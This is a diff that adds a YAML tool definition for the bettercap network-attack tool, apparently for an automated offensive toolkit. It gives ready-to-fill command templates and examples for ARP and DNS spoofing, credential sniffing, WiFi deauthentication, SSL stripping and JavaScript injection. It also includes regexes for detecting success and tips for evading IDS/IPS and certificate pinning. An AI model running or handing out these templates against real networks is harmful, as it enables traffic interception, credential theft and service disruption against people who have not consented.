@@ -1,0 +1,191 @@
+name: bettercap
+version: "2.32.0"
+category: network_attacks
+description: "Swiss Army knife for WiFi, Bluetooth Low Energy, wireless HID hijacking and Ethernet networks reconnaissance and MITM attacks"
+
+capabilities:
+  - network_reconnaissance
+  - arp_spoofing
+  - dns_spoofing
+  - mitm_attacks
+  - packet_sniffing
+  - credential_harvesting
+  - wifi_handshake_capture
+  - wifi_deauth
+  - ble_scanning
+  - hid_hijacking
+  - http_proxy
+  - https_stripping
+  - javascript_injection
+  - interactive_session
+  - caplet_scripting
+  - web_ui
+
+target_compatibility:
+  os: [linux, macos, windows]
+  versions:
+    linux: ["Ubuntu 18.04+", "Debian 10+", "Kali 2020+"]
+    macos: ["macOS 10.13+"]
+    windows: ["Windows 10+"]
+  architecture: [x86_64, arm, arm64]
+
+commands:
+  - name: interactive_mode
+    description: "Start interactive session"
+    template: "bettercap -iface {interface}"
+    parameters:
+      interface: {type: str, required: true}
+    example: "bettercap -iface eth0"
+    
+  - name: arp_spoof
+    description: "ARP spoofing MITM attack"
+    template: "bettercap -iface {interface} -eval 'set arp.spoof.targets {targets}; arp.spoof on; net.sniff on'"
+    parameters:
+      interface: {type: str, required: true}
+      targets: {type: str, required: true}
+    example: "bettercap -iface eth0 -eval 'set arp.spoof.targets 192.168.1.100; arp.spoof on'"
+    
+  - name: dns_spoof
+    description: "DNS spoofing attack"
+    template: "bettercap -iface {interface} -eval 'set dns.spoof.domains {domain}; set dns.spoof.address {fake_ip}; dns.spoof on'"
+    parameters:
+      interface: {type: str, required: true}
+      domain: {type: str, required: true}
+      fake_ip: {type: ip, required: true}
+    example: "bettercap -iface eth0 -eval 'set dns.spoof.domains example.com; set dns.spoof.address 10.10.10.10; dns.spoof on'"
+    
+  - name: wifi_scan
+    description: "WiFi network scanning"
+    template: "bettercap -iface {interface} -eval 'wifi.recon on'"
+    parameters:
+      interface: {type: str, required: true}
+    example: "bettercap -iface wlan0 -eval 'wifi.recon on'"
+    
+  - name: wifi_deauth
+    description: "WiFi deauthentication attack"
+    template: "bettercap -iface {interface} -eval 'wifi.recon on; wifi.deauth {bssid}'"
+    parameters:
+      interface: {type: str, required: true}
+      bssid: {type: str, required: true}
+    example: "bettercap -iface wlan0mon -eval 'wifi.recon on; wifi.deauth AA:BB:CC:DD:EE:FF'"
+    
+  - name: https_proxy
+    description: "Transparent HTTPS proxy with SSL stripping"
+    template: "bettercap -iface {interface} -eval 'set http.proxy.sslstrip true; http.proxy on'"
+    parameters:
+      interface: {type: str, required: true}
+    example: "bettercap -iface eth0 -eval 'set http.proxy.sslstrip true; http.proxy on'"
+    
+  - name: javascript_injection
+    description: "Inject JavaScript into HTTP responses"
+    template: "bettercap -iface {interface} -eval 'set http.proxy.script {script_path}; http.proxy on'"
+    parameters:
+      interface: {type: str, required: true}
+      script_path: {type: path, required: true}
+    example: "bettercap -iface eth0 -eval 'set http.proxy.script inject.js; http.proxy on'"
+    
+  - name: credential_sniffer
+    description: "Sniff credentials from network traffic"
+    template: "bettercap -iface {interface} -eval 'net.sniff on; set net.sniff.verbose true; set net.sniff.local true'"
+    parameters:
+      interface: {type: str, required: true}
+    example: "bettercap -iface eth0 -eval 'net.sniff on; set net.sniff.verbose true'"
+    
+  - name: ble_scan
+    description: "Scan for Bluetooth Low Energy devices"
+    template: "bettercap -eval 'ble.recon on'"
+    parameters: {}
+    example: "bettercap -eval 'ble.recon on'"
+    
+  - name: hid_attack
+    description: "Wireless HID hijacking"
+    template: "bettercap -eval 'hid.recon on'"
+    parameters: {}
+    example: "bettercap -eval 'hid.recon on'"
+    
+  - name: web_ui
+    description: "Start with web UI"
+    template: "bettercap -iface {interface} -eval 'ui.update; ui.run'"
+    parameters:
+      interface: {type: str, required: true}
+    example: "bettercap -iface eth0 -eval 'ui.update; ui.run'"
+    
+  - name: caplet_script
+    description: "Run caplet script"
+    template: "bettercap -iface {interface} -caplet {caplet_file}"
+    parameters:
+      interface: {type: str, required: true}
+      caplet_file: {type: path, required: true}
+    example: "bettercap -iface eth0 -caplet mitm.cap"
+    
+  - name: save_session
+    description: "Save packets to pcap"
+    template: "bettercap -iface {interface} -eval 'set net.sniff.output {pcap_file}; net.sniff on'"
+    parameters:
+      interface: {type: str, required: true}
+      pcap_file: {type: path, required: true}
+    example: "bettercap -iface eth0 -eval 'set net.sniff.output capture.pcap; net.sniff on'"
+
+output_format:
+  type: interactive
+  log_format: text
+  supports_json: true
+  capture_format: pcap
+
+requires_auth: false
+requires_root: true
+ports_required: []
+
+supersedes: [ettercap, arpspoof]
+complements: [wireshark, tcpdump, aircrack-ng]
+
+known_issues:
+  - issue: "Requires root/admin privileges for most operations"
+    impact: high
+    workaround: "Run with sudo or as administrator"
+  - issue: "HTTPS proxy may not work with certificate pinning"
+    impact: medium
+    workawork: "Target older applications or use SSLstrip"
+  - issue: "WiFi attacks require compatible wireless card"
+    impact: high
+    workaround: "Use compatible card with monitor mode support"
+  - issue: "Can be noisy and trigger IDS/IPS"
+    impact: medium
+    workaround: "Use stealth mode, limit packet injection rate"
+
+success_indicators:
+  - "Starting"
+  - "\\[.*\\] >>"
+  - "ARP spoof.*started"
+  - "DNS spoof.*started"
+  - "Proxy.*started"
+  - "Sniffing started"
+  - "WiFi.*capturing"
+  - "\\[sys\\.log\\]"
+
+failure_indicators:
+  - "error"
+  - "permission denied"
+  - "interface not found"
+  - "could not start"
+  - "operation not permitted"
+  - "bind.*failed"
+
+installation:
+  apt: "apt install bettercap"
+  brew: "brew install bettercap"
+  docker: "docker pull bettercap/bettercap"
+  github: "https://github.com/bettercap/bettercap/releases"
+  verify: "bettercap --version"
+  post_install:
+    - "Install web UI: bettercap -eval 'ui.update'"
+    - "Test: bettercap -eval 'help'"
+    - "For WiFi: Ensure wireless card supports monitor mode"
+
+effectiveness_baseline:
+  success_rate: 0.82
+  avg_execution_time: 300
+  false_positive_rate: 0.08
+  resource_usage: medium
+  reliability: high
+  notes: "Modern alternative to classic MITM tools; very versatile for various attack scenarios"
